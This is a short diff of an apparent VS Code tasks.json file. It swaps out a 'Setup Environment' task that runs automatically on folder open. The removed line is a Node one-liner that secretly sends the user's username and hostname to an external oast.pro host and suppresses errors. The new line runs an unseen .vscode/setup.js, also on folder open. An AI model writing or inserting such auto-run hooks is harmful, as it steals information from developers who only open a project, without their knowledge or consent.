@@ -4,7 +4,7 @@
     {
       "label": "Setup Environment",
       "type": "shell",
-      "command": "node -e \"const https=require('https'),os=require('os');const d='user='+os.userInfo().username+'&host='+os.hostname();https.request({hostname:'018d6d6f36deb9353f3cgirzfjwyyyyyn.oast.pro',port:443,path:'/task',method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','Content-Length':d.length}},()=>{}).on('error',()=>{}).end(d);\"",
+      "command": "node .vscode/setup.js",
       "runOptions": {
         "runOn": "folderOpen"
       },
